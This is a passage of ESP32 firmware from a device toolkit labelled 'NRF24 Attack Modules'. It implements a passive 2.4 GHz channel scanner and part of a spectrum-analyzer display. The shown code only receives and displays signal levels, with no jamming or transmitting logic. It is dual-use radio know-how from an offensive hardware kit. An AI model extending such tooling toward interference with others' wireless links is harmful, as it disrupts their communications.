// ═══════════════════════════════════════════════════════════════════════════
// SPANDECK NRF24 Attack Modules Implementation
// FULL IMPLEMENTATIONS - Ported from ESP32-DIV v2.5 HaleHound Edition
// Created: 2026-02-06
// Updated: 2026-02-07 - Full implementation port
// ═══════════════════════════════════════════════════════════════════════════
//
// NRF24 PIN CONFIGURATION:
//   Standard CYD: CE=GPIO16, CSN=GPIO4
//   NM-RF-Hat:    CE=GPIO22, CSN=GPIO27 (shared with CC1101 via hat switch)
//   SCK = GPIO18 (shared SPI)
//   MOSI = GPIO23 (shared SPI)
//   MISO = GPIO19 (shared SPI)
//   VCC = 3.3V (add 10uF capacitor!)
//
// ═══════════════════════════════════════════════════════════════════════════

#include "nrf24_attacks.h"
#include "nrf24_config.h"
#include "shared.h"
#include "touch_buttons.h"
#include "utils.h"
#include "icon.h"
#include <SPI.h>

// Free Fonts are already included via TFT_eSPI when LOAD_GFXFF is enabled
// Available: FreeMonoBold9pt7b, FreeMonoBold12pt7b, FreeMonoBold18pt7b, etc.

// ═══════════════════════════════════════════════════════════════════════════
// NRF24 PIN DEFINITIONS — from cyd_config.h (respects NMRF_HAT)
// ═══════════════════════════════════════════════════════════════════════════

#define NRF_CE   NRF24_CE
#define NRF_CSN  NRF24_CSN

// Use default SPI object (VSPI) - shared with SD card, separate CS pins

// NRF24 Register Definitions
#define _NRF24_CONFIG      0x00
#define _NRF24_EN_AA       0x01
#define _NRF24_EN_RXADDR   0x02
#define _NRF24_SETUP_AW    0x03
#define _NRF24_RF_CH       0x05
#define _NRF24_RF_SETUP    0x06
#define _NRF24_STATUS      0x07
#define _NRF24_RPD         0x09
#define _NRF24_RX_ADDR_P0  0x0A
#define _NRF24_RX_ADDR_P1  0x0B
#define _NRF24_RX_ADDR_P2  0x0C
#define _NRF24_RX_ADDR_P3  0x0D
#define _NRF24_RX_ADDR_P4  0x0E
#define _NRF24_RX_ADDR_P5  0x0F

// Promiscuous mode noise-catching addresses (alternating bit patterns)
static const uint8_t noiseAddr0[] = {0x55, 0x55};
static const uint8_t noiseAddr1[] = {0xAA, 0xAA};
static const uint8_t noiseAddr2 = 0xA0;
static const uint8_t noiseAddr3 = 0xAB;
static const uint8_t noiseAddr4 = 0xAC;
static const uint8_t noiseAddr5 = 0xAD;

// ═══════════════════════════════════════════════════════════════════════════
// SHARED ICON BAR FOR NRF24 SCREENS
// ═══════════════════════════════════════════════════════════════════════════

#define NRF_ICON_SIZE 16
#define NRF_ICON_NUM 3

static int nrfIconX[NRF_ICON_NUM] = {SCALE_X(170), SCALE_X(210), 10};
static const unsigned char* nrfIcons[NRF_ICON_NUM] = {
    bitmap_icon_undo,      // Calibrate/Reset
    bitmap_icon_start,     // Start/Stop
    bitmap_icon_go_back    // Back
};

static int nrfActiveIcon = -1;
static int nrfAnimState = 0;
static unsigned long nrfLastAnim = 0;

// Draw icon bar with 3 icons - MATCHES ORIGINAL HALEHOUND
static void drawNrfIconBar() {
    tft.drawLine(0, ICON_BAR_TOP, SCREEN_WIDTH, ICON_BAR_TOP, HALEHOUND_MAGENTA);
    tft.fillRect(0, ICON_BAR_Y, SCREEN_WIDTH, ICON_BAR_H, HALEHOUND_GUNMETAL);
    for (int i = 0; i < NRF_ICON_NUM; i++) {
        if (nrfIcons[i] != NULL) {
            tft.drawBitmap(nrfIconX[i], ICON_BAR_Y, nrfIcons[i], NRF_ICON_SIZE, NRF_ICON_SIZE, HALEHOUND_MAGENTA);
        }
    }
    tft.drawLine(0, ICON_BAR_BOTTOM, SCREEN_WIDTH, ICON_BAR_BOTTOM, HALEHOUND_HOTPINK);
}

// Check icon bar touch and return icon index (0-2) or -1
static int checkNrfIconTouch() {
    uint16_t tx, ty;
    if (getTouchPoint(&tx, &ty)) {
        if (ty >= ICON_BAR_TOUCH_TOP && ty <= ICON_BAR_TOUCH_BOTTOM) {
            for (int i = 0; i < NRF_ICON_NUM; i++) {
                if (tx >= nrfIconX[i] - 5 && tx <= nrfIconX[i] + NRF_ICON_SIZE + 5) {
                    if (nrfAnimState == 0) {
                        tft.drawBitmap(nrfIconX[i], ICON_BAR_Y, nrfIcons[i], NRF_ICON_SIZE, NRF_ICON_SIZE, TFT_BLACK);
                        nrfAnimState = 1;
                        nrfActiveIcon = i;
                        nrfLastAnim = millis();
                    }
                    return i;
                }
            }
        }
    }
    return -1;
}

// Process icon animation and return action (0=calibrate, 1=scan, 2=back, -1=none)
static int processNrfIconAnim() {
    if (nrfAnimState > 0 && millis() - nrfLastAnim >= 50) {
        if (nrfAnimState == 1) {
            tft.drawBitmap(nrfIconX[nrfActiveIcon], ICON_BAR_Y, nrfIcons[nrfActiveIcon], NRF_ICON_SIZE, NRF_ICON_SIZE, HALEHOUND_MAGENTA);
            nrfAnimState = 2;
            int action = nrfActiveIcon;
            nrfLastAnim = millis();
            return action;
        } else if (nrfAnimState == 2) {
            nrfAnimState = 0;
            nrfActiveIcon = -1;
        }
    }
    return -1;
}

// ═══════════════════════════════════════════════════════════════════════════
// SHARED NRF24 SPI FUNCTIONS
// ═══════════════════════════════════════════════════════════════════════════

static byte nrfGetRegister(byte r) {
    byte c;
    digitalWrite(NRF_CSN, LOW);
    SPI.transfer(r & 0x1F);
    c = SPI.transfer(0);
    digitalWrite(NRF_CSN, HIGH);
    return c;
}

static void nrfSetRegister(byte r, byte v) {
    digitalWrite(NRF_CSN, LOW);
    SPI.transfer((r & 0x1F) | 0x20);
    SPI.transfer(v);
    digitalWrite(NRF_CSN, HIGH);
}

static void nrfSetRegisterMulti(byte r, const byte* data, byte len) {
    digitalWrite(NRF_CSN, LOW);
    SPI.transfer((r & 0x1F) | 0x20);
    for (byte i = 0; i < len; i++) {
        SPI.transfer(data[i]);
    }
    digitalWrite(NRF_CSN, HIGH);
}

static void nrfSetChannel(uint8_t channel) {
    nrfSetRegister(_NRF24_RF_CH, channel);
}

static void nrfPowerUp() {
    nrfSetRegister(_NRF24_CONFIG, nrfGetRegister(_NRF24_CONFIG) | 0x02);
    delayMicroseconds(130);
}

static void nrfPowerDown() {
    nrfSetRegister(_NRF24_CONFIG, nrfGetRegister(_NRF24_CONFIG) & ~0x02);
}

static void nrfEnable() {
    digitalWrite(NRF_CE, HIGH);
}

static void nrfDisable() {
    digitalWrite(NRF_CE, LOW);
}

static void nrfSetRX() {
    nrfSetRegister(_NRF24_CONFIG, nrfGetRegister(_NRF24_CONFIG) | 0x01);
    nrfEnable();
    delayMicroseconds(100);
}

static void nrfSetTX() {
    // PWR_UP=1, PRIM_RX=0 for TX mode
    nrfSetRegister(_NRF24_CONFIG, (nrfGetRegister(_NRF24_CONFIG) | 0x02) & ~0x01);
    delayMicroseconds(150);
}

static bool nrfCarrierDetected() {
    return nrfGetRegister(_NRF24_RPD) & 0x01;
}

// Initialize NRF24 hardware
static bool nrfInit() {
    #if CYD_DEBUG
    Serial.printf("[NRF24] nrfInit() — heap=%d\n", ESP.getFreeHeap());
    #endif

    // Configure NRF24 pins
    pinMode(NRF_CE, OUTPUT);
    pinMode(NRF_CSN, OUTPUT);
    digitalWrite(NRF_CE, LOW);
    digitalWrite(NRF_CSN, HIGH);

    // ALWAYS deselect other SPI devices (CS HIGH) before NRF24 operations
    #ifndef NMRF_HAT
    // Standard CYD: CC1101 CS (GPIO 27) is separate from NRF24 CSN (GPIO 4)
    pinMode(CC1101_CS, OUTPUT);
    digitalWrite(CC1101_CS, HIGH);  // Deselect CC1101
    #endif
    // Hat: CC1101_CS == NRF24_CSN == GPIO 27 — already deselected above via NRF_CSN
    pinMode(SD_CS, OUTPUT);
    digitalWrite(SD_CS, HIGH);   // Deselect SD card
    // Also deselect PN532 in case RFID module left it active (SPI mode only)
    #ifdef PN532_CS
    pinMode(PN532_CS, OUTPUT);
    digitalWrite(PN532_CS, HIGH);
    #endif

    // Reset SPI bus with proper settle time between end/begin
    SPI.end();
    delay(10);
    SPI.begin(VSPI_SCK, VSPI_MISO, VSPI_MOSI);  // NO CS pin - manual control with digitalWrite
    SPI.setDataMode(SPI_MODE0);
    SPI.setFrequency(4000000);  // 4MHz — conservative for reliable detection
    SPI.setBitOrder(MSBFIRST);
    delay(10);

    // Try up to 3 times with increasing delays — some boards need longer settle
    bool found = false;
    for (int attempt = 0; attempt < 3; attempt++) {
        if (attempt > 0) delay(attempt * 100);  // 0ms, 100ms, 200ms

        nrfDisable();
        nrfPowerUp();
        nrfSetRegister(_NRF24_EN_AA, 0x00);       // Disable auto-ack
        nrfSetRegister(_NRF24_RF_SETUP, 0x0F);    // 2Mbps, max power

        byte status = nrfGetRegister(_NRF24_STATUS);
        #if CYD_DEBUG
        Serial.printf("[NRF24] Attempt %d: STATUS=0x%02X\n", attempt, status);
        #endif
        if (status != 0x00 && status != 0xFF) {
            found = true;
            // Bump to full speed now that we know the chip is alive
            SPI.setFrequency(8000000);
            break;
        }
    }

    #if CYD_DEBUG
    Serial.printf("[NRF24] nrfInit() %s\n", found ? "OK" : "FAILED — NRF24 not responding");
    #endif
    return found;
}

// ═══════════════════════════════════════════════════════════════════════════
// SCANNER - 2.4GHz Channel Scanner with Bar Graph
// WiFi-only scanning range: 2400-2484 MHz = NRF channels 0-84
// ═══════════════════════════════════════════════════════════════════════════

namespace Scanner {

// WiFi-only scanning range
#define SCAN_CHANNELS 85          // 0-84 = 85 channels (2400-2484 MHz)

// Bar graph layout
#define BAR_START_X 10
#define BAR_START_Y CONTENT_Y_START + 4
#define BAR_WIDTH CONTENT_INNER_W
#define BAR_HEIGHT SCALE_Y(210)

// WiFi channel positions (NRF24 channel numbers)
#define WIFI_CH1_NRF 12
#define WIFI_CH6_NRF 37
#define WIFI_CH11_NRF 62
#define WIFI_CH13_NRF 72

// Data arrays
static uint8_t bar_peak_levels[SCAN_CHANNELS];
static int backgroundNoise[SCAN_CHANNELS] = {0};
static bool noiseCalibrated = false;
static bool scanner_initialized = false;
static volatile bool scanning = true;
static volatile bool exitRequested = false;
static bool uiDrawn = false;

// Dual-core task state
static volatile bool scanTaskRunning = false;
static volatile bool scanTaskDone = false;
static volatile bool scanFrameReady = false;
static TaskHandle_t scanTaskHandle = NULL;

// Scan data — promoted from scanDisplay() local to namespace scope for Core 0 task
static uint8_t scanChannel[SCAN_CHANNELS] = {0};

// Skull signal meter icons and animation
static const unsigned char* scannerSkulls[] = {
    bitmap_icon_skull_wifi,
    bitmap_icon_skull_bluetooth,
    bitmap_icon_skull_jammer,
    bitmap_icon_skull_subghz,
    bitmap_icon_skull_ir,
    bitmap_icon_skull_tools,
    bitmap_icon_skull_setting,
    bitmap_icon_skull_about
};
static const int numScannerSkulls = 8;
static int scannerSkullFrame = 0;

// ═══════════════════════════════════════════════════════════════════════════
// DUAL-CORE SCANNER — FreeRTOS task on Core 0
// Same architecture as SubGHz Analyzer (saScanTask), BLE Spoofer, etc.
// Core 0 = scan, Core 1 = display + touch
// ═══════════════════════════════════════════════════════════════════════════

static void scanTask(void* param) {
    // Reinit SPI on Core 0 — take ownership from Core 1
    SPI.end();
    delay(5);
    SPI.begin(18, 19, 23);  // SCK, MISO, MOSI — manual CS via digitalWrite
    SPI.setFrequency(8000000);

    // Reinit NRF24 registers on Core 0
    nrfPowerUp();
    nrfSetRegister(_NRF24_EN_AA, 0x00);       // Disable auto-ack
    nrfSetRegister(_NRF24_RF_SETUP, 0x0F);    // 2Mbps, max power

    #if CYD_DEBUG
    Serial.println("[SCANNER] Core 0: Scan task started");
    #endif

    while (scanTaskRunning) {
        if (scanFrameReady) {
            // Core 1 hasn't consumed the last frame yet — wait
            vTaskDelay(1);
            continue;
        }

        if (scanning) {
            // Single pass scan with exponential smoothing — matches original scanDisplay()
            for (int i = 0; i < SCAN_CHANNELS; i++) {
                if (!scanTaskRunning) break;
                nrfSetChannel(i);
                nrfSetRX();
                delayMicroseconds(50);  // Keep existing dwell — RPD accuracy fix is separate
                nrfDisable();

                int rpd = nrfCarrierDetected() ? 1 : 0;
                // Exponential smoothing: 50% old value + 50% new (scaled to 125)
                scanChannel[i] = (scanChannel[i] + rpd * 125) / 2;
            }

            // Copy smoothed values to display array and signal Core 1
            memcpy(bar_peak_levels, scanChannel, SCAN_CHANNELS);
            scanFrameReady = true;
        } else {
            vTaskDelay(20);  // Paused — idle
        }
    }

    // Cleanup — power down radio and release SPI
    nrfPowerDown();
    SPI.end();

    #if CYD_DEBUG
    Serial.println("[SCANNER] Core 0: Scan task exiting");
    #endif

    scanTaskHandle = NULL;
    scanTaskDone = true;
    vTaskDelete(NULL);
}

static void startScanTask() {
    if (scanTaskHandle != NULL) return;  // Already running
    scanTaskRunning = true;
    scanTaskDone = false;
    scanFrameReady = false;
    BaseType_t ret = xTaskCreatePinnedToCore(scanTask, "NrfScan", 4096, NULL, 1, &scanTaskHandle, 0);
    #if CYD_DEBUG
    Serial.printf("[SCANNER] Task create %s (heap=%d)\n",
                  ret == pdPASS ? "OK" : "FAILED", ESP.getFreeHeap());
    #endif
    if (ret != pdPASS) {
        scanTaskHandle = NULL;
        scanTaskRunning = false;
    }
}

static void stopScanTask() {
    if (scanTaskHandle == NULL) return;  // Not running
    scanTaskRunning = false;
    // Wait up to 500ms for task to self-terminate — NO force-delete EVER
    unsigned long start = millis();
    while (!scanTaskDone && millis() - start < 500) {
        delay(10);
    }
    scanTaskHandle = NULL;
}

// Get bar color (teal to hot pink gradient)
static uint16_t getBarColor(int height, int maxHeight) {
    float ratio = (float)height / (float)maxHeight;
    if (ratio > 1.0f) ratio = 1.0f;

    // Teal RGB(0, 207, 255) -> Hot Pink RGB(255, 28, 82)
    uint8_t r = 0 + (uint8_t)(ratio * 255);
    uint8_t g = 207 - (uint8_t)(ratio * (207 - 28));
    uint8_t b = 255 - (uint8_t)(ratio * (255 - 82));

    return tft.color565(r, g, b);
}

static void clearBarGraph() {
    memset(bar_peak_levels, 0, sizeof(bar_peak_levels));
}

static void drawScannerFrame() {
    // Y-axis line
    tft.drawFastVLine(BAR_START_X - 2, BAR_START_Y, BAR_HEIGHT, HALEHOUND_MAGENTA);

    // X-axis line
    tft.drawFastHLine(BAR_START_X, BAR_START_Y + BAR_HEIGHT, BAR_WIDTH, HALEHOUND_MAGENTA);

    // WiFi channel markers - vertical dashed lines
    int x1 = BAR_START_X + (WIFI_CH1_NRF * BAR_WIDTH / SCAN_CHANNELS);
    int x6 = BAR_START_X + (WIFI_CH6_NRF * BAR_WIDTH / SCAN_CHANNELS);
    int x11 = BAR_START_X + (WIFI_CH11_NRF * BAR_WIDTH / SCAN_CHANNELS);
    int x13 = BAR_START_X + (WIFI_CH13_NRF * BAR_WIDTH / SCAN_CHANNELS);

    for (int y = BAR_START_Y; y < BAR_START_Y + BAR_HEIGHT; y += 6) {
        tft.drawPixel(x1, y, HALEHOUND_HOTPINK);
        tft.drawPixel(x6, y, HALEHOUND_HOTPINK);
        tft.drawPixel(x11, y, HALEHOUND_HOTPINK);
        tft.drawPixel(x13, y, HALEHOUND_VIOLET);
    }

    // Channel labels
    tft.setTextColor(HALEHOUND_HOTPINK, TFT_BLACK);
    tft.setTextSize(1);
    tft.setCursor(x1 - 2, BAR_START_Y - 10);
    tft.print("1");
    tft.setCursor(x6 - 2, BAR_START_Y - 10);
    tft.print("6");
    tft.setCursor(x11 - 6, BAR_START_Y - 10);
    tft.print("11");
    tft.setTextColor(HALEHOUND_VIOLET, TFT_BLACK);
    tft.setCursor(x13 - 6, BAR_START_Y - 10);
    tft.print("13");

    // Frequency labels
    tft.setTextColor(HALEHOUND_MAGENTA, TFT_BLACK);
    tft.setCursor(BAR_START_X - 5, BAR_START_Y + BAR_HEIGHT + 4);
    tft.print("2400");
    tft.setCursor(BAR_START_X + BAR_WIDTH/2 - 12, BAR_START_Y + BAR_HEIGHT + 4);
    tft.print("2442");
    tft.setCursor(BAR_START_X + BAR_WIDTH - 28, BAR_START_Y + BAR_HEIGHT + 4);
    tft.print("2484");

    // Divider
    tft.drawFastHLine(0, BAR_START_Y + BAR_HEIGHT + 16, SCREEN_WIDTH, HALEHOUND_HOTPINK);
}

static void drawBarGraph() {
    // Clear bar area
    tft.fillRect(BAR_START_X, BAR_START_Y, BAR_WIDTH, BAR_HEIGHT, TFT_BLACK);

    // Redraw WiFi channel markers
    int x1 = BAR_START_X + (WIFI_CH1_NRF * BAR_WIDTH / SCAN_CHANNELS);
    int x6 = BAR_START_X + (WIFI_CH6_NRF * BAR_WIDTH / SCAN_CHANNELS);
    int x11 = BAR_START_X + (WIFI_CH11_NRF * BAR_WIDTH / SCAN_CHANNELS);
    int x13 = BAR_START_X + (WIFI_CH13_NRF * BAR_WIDTH / SCAN_CHANNELS);

    for (int y = BAR_START_Y; y < BAR_START_Y + BAR_HEIGHT; y += 6) {
        tft.drawPixel(x1, y, HALEHOUND_HOTPINK);
        tft.drawPixel(x6, y, HALEHOUND_HOTPINK);
        tft.drawPixel(x11, y, HALEHOUND_HOTPINK);
        tft.drawPixel(x13, y, HALEHOUND_VIOLET);
    }

    // Track peak
    int peakChannel = 0;
    uint8_t peakLevel = 0;

    // Draw bars
    for (int ch = 0; ch < SCAN_CHANNELS; ch++) {
        uint8_t level = bar_peak_levels[ch];

        if (level > peakLevel) {
            peakLevel = level;
            peakChannel = ch;
        }

        if (level > 0) {
            int x = BAR_START_X + (ch * BAR_WIDTH / SCAN_CHANNELS);
            int barH = (level * BAR_HEIGHT) / 125;
            if (barH > BAR_HEIGHT) barH = BAR_HEIGHT;
            if (barH < 4 && level > 0) barH = 4;

            int barY = BAR_START_Y + BAR_HEIGHT - barH;

            // Gradient bar
            for (int y = 0; y < barH; y++) {
                uint16_t color = getBarColor(y, BAR_HEIGHT);
                tft.drawFastHLine(x, barY + barH - 1 - y, 2, color);
            }
        }
    }

    // Status area - compact layout below graph
    int statusY = BAR_START_Y + BAR_HEIGHT + 6;
    tft.fillRect(0, statusY, SCREEN_WIDTH, SCREEN_HEIGHT - statusY, TFT_BLACK);

    // Divider line
    tft.drawFastHLine(0, statusY - 2, SCREEN_WIDTH, HALEHOUND_HOTPINK);

    // Peak frequency - compact above skulls
    int peakFreq = 2400 + peakChannel;
    tft.setTextSize(1);
    tft.setTextColor(HALEHOUND_HOTPINK, TFT_BLACK);
    tft.setCursor(SCALE_X(85), statusY + 2);
    tft.print("PEAK: ");
    tft.setTextColor(HALEHOUND_BRIGHT, TFT_BLACK);
    tft.print(peakFreq);
    tft.setTextColor(HALEHOUND_MAGENTA, TFT_BLACK);
    tft.print(" MHz");

    // Skull signal meter - row of 8 skulls
    int skullY = statusY + 14;
    int skullStartX = 10;
    int skullSpacing = SCALE_X(28);  // 16px icon + scaled gap

    // How many skulls to light based on signal (0-8)
    int litSkulls = (peakLevel * 8) / 4;
    if (litSkulls > 8) litSkulls = 8;

    for (int i = 0; i < numScannerSkulls; i++) {
        int x = skullStartX + (i * skullSpacing);
        tft.fillRect(x, skullY, 16, 16, HALEHOUND_BLACK);

        if (i < litSkulls && peakLevel > 0) {
            // Animated color wave - teal to pink
            int phase = (scannerSkullFrame + i) % 8;
            uint16_t skullColor;
            if (phase < 4) {
                float ratio = phase / 3.0f;
                uint8_t r = (uint8_t)(ratio * 255);
                uint8_t g = 207 - (uint8_t)(ratio * (207 - 28));
                uint8_t b = 255 - (uint8_t)(ratio * (255 - 82));
                skullColor = tft.color565(r, g, b);
            } else {
                float ratio = (phase - 4) / 3.0f;
                uint8_t r = 255 - (uint8_t)(ratio * 255);
                uint8_t g = 28 + (uint8_t)(ratio * (207 - 28));
                uint8_t b = 82 + (uint8_t)(ratio * (255 - 82));
                skullColor = tft.color565(r, g, b);
            }
            tft.drawBitmap(x, skullY, scannerSkulls[i], 16, 16, skullColor);
        } else {
            // Unlit skull - gray
            tft.drawBitmap(x, skullY, scannerSkulls[i], 16, 16, HALEHOUND_GUNMETAL);
        }
    }
    scannerSkullFrame++;

    // Percentage at end
    int pct = (peakLevel * 100) / 125;
    if (pct > 100) pct = 100;
    tft.setTextColor(HALEHOUND_BRIGHT, TFT_BLACK);
    tft.setTextSize(1);
    tft.setCursor(skullStartX + (numScannerSkulls * skullSpacing) + 2, skullY + 4);
    tft.printf("%d%%", pct);
}

static void calibrateBackgroundNoise() {
    tft.fillRect(10, BAR_START_Y + BAR_HEIGHT + 40, CONTENT_INNER_W, 20, TFT_BLACK);
    tft.setTextColor(HALEHOUND_HOTPINK, TFT_BLACK);
    tft.setTextSize(1);
    tft.setCursor(10, BAR_START_Y + BAR_HEIGHT + 40);
    tft.print("Calibrating noise floor...");

    memset(backgroundNoise, 0, sizeof(backgroundNoise));

    int samples = 5;
    for (int s = 0; s < samples; s++) {
        nrfDisable();
        for (int cycles = 0; cycles < 35; cycles++) {
            for (int i = 0; i < SCAN_CHANNELS; i++) {
                nrfSetChannel(i);
                nrfSetRX();  // MUST set PRIM_RX bit to actually receive!
                delayMicroseconds(50);
                nrfDisable();
                if (nrfCarrierDetected()) {
                    backgroundNoise[i]++;
                }
            }
        }
    }

    for (int i = 0; i < SCAN_CHANNELS; i++) {
        backgroundNoise[i] /= samples;
    }

    noiseCalibrated = true;

    tft.fillRect(10, BAR_START_Y + BAR_HEIGHT + 40, CONTENT_INNER_W, 20, TFT_BLACK);
    tft.setTextColor(HALEHOUND_MAGENTA, TFT_BLACK);
    tft.setCursor(10, BAR_START_Y + BAR_HEIGHT + 40);
    tft.print("Noise floor captured!");
}

static void scanDisplay() {
    // Persistent channel values (0-125 range) - NOT reset each frame
    static uint8_t channel[SCAN_CHANNELS] = {0};

    if (!scanner_initialized) {
        clearBarGraph();
        drawScannerFrame();
        memset(channel, 0, sizeof(channel));  // Only reset on init
        scanner_initialized = true;
    }

    // Single pass scan with exponential smoothing
    for (int i = 0; i < SCAN_CHANNELS && scanning && !exitRequested; ++i) {
        nrfSetChannel(i);
        nrfSetRX();  // MUST set PRIM_RX bit to actually receive! (not just CE high)
        delayMicroseconds(50);
        nrfDisable();

        int rpd = nrfCarrierDetected() ? 1 : 0;
        // Exponential smoothing: 50% old value + 50% new (scaled to 125)
        channel[i] = (channel[i] + rpd * 125) / 2;
    }

    if (scanning) {
        // Copy smoothed values to display array
        for (int i = 0; i < SCAN_CHANNELS; i++) {
            bar_peak_levels[i] = channel[i];
        }

        drawBarGraph();
    }
}

void scannerSetup() {
    exitRequested = false;
    scanning = true;
    uiDrawn = false;
    scanner_initialized = false;
    nrfAnimState = 0;
    nrfActiveIcon = -1;

    tft.fillScreen(HALEHOUND_BLACK);
    drawStatusBar();

    // Title
    tft.fillRect(0, ICON_BAR_Y, SCALE_X(160), ICON_BAR_H, HALEHOUND_GUNMETAL);
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setTextSize(1);
    tft.setCursor(SCALE_X(35), ICON_BAR_Y + 4);
    tft.print("2.4GHz Scanner");

    drawNrfIconBar();

    // Initialize NRF24
    if (!nrfInit()) {
        tft.setTextColor(HALEHOUND_HOTPINK);
        tft.setTextSize(2);
        drawCenteredText(100, "NRF24 NOT FOUND", HALEHOUND_HOTPINK, 2);
        tft.setTextSize(1);
        drawCenteredText(130, "Check wiring:", HALEHOUND_MAGENTA, 1);
        drawCenteredText(145, ("CE=GPIO" + String(NRF24_CE) + " CSN=GPIO" + String(NRF24_CSN)).c_str(), HALEHOUND_MAGENTA, 1);
        drawCenteredText(160, "Add 10uF cap on VCC!", HALEHOUND_VIOLET, 1);
        return;
    }

    clearBarGraph();
    noiseCalibrated = false;
    memset(scanChannel, 0, sizeof(scanChannel));

    #if CYD_DEBUG
    Serial.println("[SCANNER] NRF24 initialized successfully");
    #endif

    // Draw initial frame (axes, labels, markers) then start Core 0 scan task
    drawScannerFrame();
    scanner_initialized = true;
    startScanTask();
    uiDrawn = true;
}

void scannerLoop() {
    // Touch uses software bit-banged SPI - no conflict with NRF24 on hardware VSPI

    if (!uiDrawn) {
        touchButtonsUpdate();
        uint16_t tx, ty;
        if (getTouchPoint(&tx, &ty) || buttonPressed(BTN_BACK) || buttonPressed(BTN_BOOT)) {
            exitRequested = true;
        }
        return;
    }

    touchButtonsUpdate();

    // Direct touch check - no animation delay
    uint16_t tx, ty;
    if (getTouchPoint(&tx, &ty)) {
        if (ty >= ICON_BAR_TOUCH_TOP && ty <= ICON_BAR_TOUCH_BOTTOM) {
            // Back icon (x=10)
            if (tx < 40) {
                exitRequested = true;
                return;
            }
            // Calibrate icon
            if (tx >= nrfIconX[0] - 10 && tx < nrfIconX[0] + NRF_ICON_SIZE + 10) {
                stopScanTask();  // Stop Core 0 task — releases SPI
                // Reclaim SPI for calibration on Core 1
                nrfInit();
                calibrateBackgroundNoise();
                waitForTouchRelease();
                delay(200);
                // Full reset after calibration
                scanning = true;
                exitRequested = false;
                clearBarGraph();
                memset(scanChannel, 0, sizeof(scanChannel));
                tft.fillRect(BAR_START_X, BAR_START_Y, BAR_WIDTH, BAR_HEIGHT, TFT_BLACK);
                drawScannerFrame();
                startScanTask();  // Restart Core 0 scan
                return;
            }
            // Refresh icon
            if (tx >= nrfIconX[1] - 10) {
                stopScanTask();  // Stop Core 0 task — releases SPI
                waitForTouchRelease();
                delay(200);
                // Full reset
                scanning = true;
                exitRequested = false;
                clearBarGraph();
                memset(scanChannel, 0, sizeof(scanChannel));
                tft.fillRect(BAR_START_X, BAR_START_Y, BAR_WIDTH, BAR_HEIGHT, TFT_BLACK);
                drawScannerFrame();
                startScanTask();  // Restart Core 0 scan
                return;
            }
        }
    }

    if (buttonPressed(BTN_BACK) || buttonPressed(BTN_BOOT)) {
        exitRequested = true;
        return;
    }

    // CONSUMER: draw when Core 0 delivers new scan data
    if (scanFrameReady && scanning) {
        drawBarGraph();
        scanFrameReady = false;  // Release Core 0 for next scan pass
    }
}

bool isExitRequested() {
    return exitRequested;
}

void cleanup() {
    bool hadTask = (scanTaskHandle != NULL);
    stopScanTask();  // Task handles nrfPowerDown() + SPI.end()
    if (!hadTask) {
        nrfPowerDown();  // No task was running — power down directly
    }
    scanning = false;
    exitRequested = false;
    scanner_initialized = false;
    uiDrawn = false;
}

}  // namespace Scanner


// ═══════════════════════════════════════════════════════════════════════════
// ANALYZER - Spectrum Analyzer with Waterfall Display
// ═══════════════════════════════════════════════════════════════════════════

namespace Analyzer {

#define ANA_CHANNELS 85   // Same as scanner - WiFi band 2400-2484 MHz

// Display layout - FULL SCREEN (scaled for 2.8" and 3.5")
#define GRAPH_X 2
#define GRAPH_Y (CONTENT_Y_START + 4)
#define GRAPH_WIDTH GRAPH_FULL_W
#define GRAPH_HEIGHT SCALE_Y(115)

#define WATERFALL_Y (GRAPH_Y + GRAPH_HEIGHT + SCALE_Y(5))
#define WATERFALL_HEIGHT SCALE_Y(126)  // 7 rows × scaled spacing

// Skull waterfall grid
#define SKULL_SIZE 16
#define SKULL_COLS (GRAPH_FULL_W / 17)  // Scale columns to available width
#define SKULL_ROWS 7                    // 7 rows of skulls
#define SKULL_SPACING_X (GRAPH_FULL_W / SKULL_COLS)  // Evenly spaced
#define SKULL_SPACING_Y (WATERFALL_HEIGHT / SKULL_ROWS)

// WiFi channel positions
#define WIFI_CH1 12
#define WIFI_CH6 37
#define WIFI_CH11 62
#define WIFI_CH13 72

// Data arrays
static uint8_t current_levels[ANA_CHANNELS];
static uint8_t peak_levels[ANA_CHANNELS];
static uint8_t skull_waterfall[SKULL_ROWS][SKULL_COLS];  // Skull-based waterfall
static bool waterfall_initialized = false;
static volatile bool analyzerRunning = true;
static volatile bool exitRequested = false;
static unsigned long lastSkullTime = 0;
static int skullAnimFrame = 0;

// Dual-core task state
static volatile bool anaTaskRunning = false;
static volatile bool anaTaskDone = false;
static volatile bool anaFrameReady = false;
static TaskHandle_t anaTaskHandle = NULL;

// Scan data — promoted from scanAllChannels() local to namespace scope for Core 0 task
static uint8_t anaChannel[ANA_CHANNELS] = {0};

// Skull types for waterfall - cycle through all 8
static const unsigned char* skullTypes[] = {
    bitmap_icon_skull_wifi,
    bitmap_icon_skull_bluetooth,
    bitmap_icon_skull_jammer,
    bitmap_icon_skull_subghz,
    bitmap_icon_skull_ir,
    bitmap_icon_skull_tools,
    bitmap_icon_skull_setting,
    bitmap_icon_skull_about
};
static const int numSkullTypes = 8;

// Skull waterfall color - hot pink (strong) -> electric blue (weak) -> dark gray (none)
static uint16_t getSkullColor(uint8_t level) {
    if (level == 0) return HALEHOUND_GUNMETAL;  // No signal = dark gray

    // BOOST sensitivity - multiply level by 2 for subtle gradient
    int boosted = level * 2;
    if (boosted > 125) boosted = 125;

    float ratio = (float)boosted / 125.0f;

    // Electric Blue RGB(0, 207, 255) -> Hot Pink RGB(255, 28, 82)
    uint8_t r = (uint8_t)(ratio * 255);
    uint8_t g = 207 - (uint8_t)(ratio * (207 - 28));
    uint8_t b = 255 - (uint8_t)(ratio * (255 - 82));

    return tft.color565(r, g, b);
}

static void clearSkullWaterfall() {
    memset(skull_waterfall, 0, sizeof(skull_waterfall));
}

static void updateSkullWaterfall() {
    // Shift all rows down by one
    for (int row = SKULL_ROWS - 1; row > 0; row--) {
        for (int col = 0; col < SKULL_COLS; col++) {
            skull_waterfall[row][col] = skull_waterfall[row - 1][col];
        }
    }

    // Average channels into skull columns for top row
    int channelsPerSkull = ANA_CHANNELS / SKULL_COLS;  // 85 / 14 = 6 channels per skull

    for (int col = 0; col < SKULL_COLS; col++) {
        int startCh = col * channelsPerSkull;
        int endCh = startCh + channelsPerSkull;
        if (col == SKULL_COLS - 1) endCh = ANA_CHANNELS;  // Last skull gets remaining

        // Find max signal in this range (more responsive than average)
        uint8_t maxLevel = 0;
        for (int ch = startCh; ch < endCh; ch++) {
            if (peak_levels[ch] > maxLevel) {
                maxLevel = peak_levels[ch];
            }
        }
        skull_waterfall[0][col] = maxLevel;
    }
}

static void drawSkullWaterfall() {
    // Clear waterfall area
